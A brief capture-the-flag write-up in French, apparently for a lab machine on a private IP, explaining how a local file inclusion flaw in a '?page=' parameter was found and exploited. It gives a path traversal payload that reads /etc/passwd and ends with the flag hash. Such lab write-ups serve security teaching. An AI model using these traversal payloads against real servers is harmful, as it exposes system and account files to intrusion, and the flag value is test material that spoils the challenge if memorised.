FLAG 2 – LFI (Local File Inclusion)

Sur certaines pages comme :
http://192.168.1.47/?page=home
http://192.168.1.47/?page=survey

Le contenu change selon la valeur de la page.

Donc on teste si on peut charger un autre fichier :
?page=test

On a une erreur. Le serveur essaie bien de charger un fichier. Ce qui est une vulnérabilité.

On test un fichier connu du serveur :
?page=../../etc/passwd

Ce n'est souvent pas suffisant donc nous ajoutons ../ jusqu'à trouver une reponse.


http://192.168.1.47/?page=../../../../../../../etc/passwd

<img width="980" height="241" alt="image" src="https://github.com/user-attachments/assets/32fe1d5f-d609-42e6-8735-1e537ab8b7af" />



b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
